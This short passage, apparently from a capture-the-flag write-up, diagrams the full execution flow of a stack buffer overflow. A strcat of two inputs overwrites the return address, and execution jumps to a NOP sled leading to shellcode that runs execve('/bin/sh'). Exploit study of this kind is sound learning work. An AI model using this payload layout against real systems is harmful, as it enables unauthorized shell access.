## Full execution flow

```
1. p() input1  → large buffer = NOP*200 + shellcode
                 local_34     = NOP*20 (strncpy)
2. p() input2  → local_20     = 'A'*9 + addr + 'B'*7
3. strcpy()    → dest         = NOP*20
4. strcat()    → dest         = NOP*20 + ' ' + 'A'*9 + addr + 'B'*7
                 overflows dest → overwrites return address
5. ret         → jumps to 0xbfffe710
6. NOP sled    → slides to shellcode at 0xbfffe748
7. shellcode   → execve("/bin/sh")
8.             → shell !
```

